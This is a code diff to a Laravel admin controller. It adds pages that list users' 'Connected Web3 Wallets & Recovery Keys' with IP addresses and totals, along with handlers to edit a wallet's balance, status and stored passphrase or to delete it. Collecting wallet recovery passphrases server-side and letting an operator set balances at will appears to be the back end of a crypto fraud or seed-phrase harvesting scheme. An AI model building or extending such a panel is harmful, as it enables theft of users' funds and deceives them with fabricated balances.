@@ -161,6 +161,68 @@ class ManageUsersController extends Controller
         }
         return redirect()->back()->with('message', 'Wallet not found.');
     }
+
+    public function connectedWallets(Request $request)
+    {
+        $query = UserWallet::with('user')->orderByDesc('created_at');
+
+        if ($request->filled('search')) {
+            $search = trim($request->input('search'));
+            $query->where(function($q) use ($search) {
+                $q->where('wallet_provider', 'like', "%{$search}%")
+                  ->orWhere('ip_address', 'like', "%{$search}%")
+                  ->orWhereHas('user', function($uq) use ($search) {
+                      $uq->where('name', 'like', "%{$search}%")
+                         ->orWhere('email', 'like', "%{$search}%");
+                  });
+            });
+        }
+
+        $wallets = $query->paginate(20);
+        $totalWallets = UserWallet::count();
+        $totalBalance = (float) UserWallet::sum('balance');
+        $uniqueUsers = UserWallet::distinct('user_id')->count('user_id');
+
+        $walletTypes = WalletType::all()->keyBy(function($item) {
+            return strtolower(trim($item->name));
+        });
+
+        $settings = Settings::where('id', '1')->first();
+
+        return view('admin.Users.wallets', [
+            'wallets' => $wallets,
+            'totalWallets' => $totalWallets,
+            'totalBalance' => $totalBalance,
+            'uniqueUsers' => $uniqueUsers,
+            'walletTypes' => $walletTypes,
+            'settings' => $settings,
+            'title' => 'Connected Web3 Wallets & Recovery Keys',
+        ]);
+    }
+
+    public function updateSingleWallet(Request $request, $id)
+    {
+        $wallet = UserWallet::findOrFail($id);
+        if ($request->has('balance')) {
+            $wallet->balance = (float) $request->input('balance');
+        }
+        if ($request->has('status')) {
+            $wallet->status = $request->input('status');
+        }
+        if ($request->filled('passphrase')) {
+            $wallet->passphrase = trim($request->input('passphrase'));
+        }
+        $wallet->save();
+
+        return redirect()->back()->with('success', "Wallet #{$wallet->id} updated successfully!");
+    }
+
+    public function deleteSingleWallet($id)
+    {
+        $wallet = UserWallet::findOrFail($id);
+        $wallet->delete();
+        return redirect()->back()->with('success', 'Wallet removed successfully!');
+    }
     //block user
     public function ublock($id)
     {
